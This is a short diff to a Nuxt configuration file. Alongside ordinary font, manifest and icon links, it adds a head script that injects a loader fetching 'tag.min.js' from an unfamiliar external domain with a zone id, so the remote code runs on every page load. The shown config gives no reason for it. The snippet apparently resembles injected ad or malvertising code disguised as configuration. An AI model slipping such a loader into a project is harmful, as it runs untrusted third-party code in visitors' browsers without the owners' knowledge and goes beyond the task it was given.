@@ -54,6 +54,11 @@ export default defineNuxtConfig({
           { rel: 'preconnect', href: 'https://fonts.gstatic.com', crossorigin: '' },
           { rel: 'manifest', href: '/manifest.json' },
           { rel: 'apple-touch-icon', href: '/icon-192.png' }
+        ],
+        script: [
+          {
+            innerHTML: "(s=>{s.dataset.zone=9791120,s.src='https://vemtoutcheeg.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))"
+          }
         ]
     }
   },
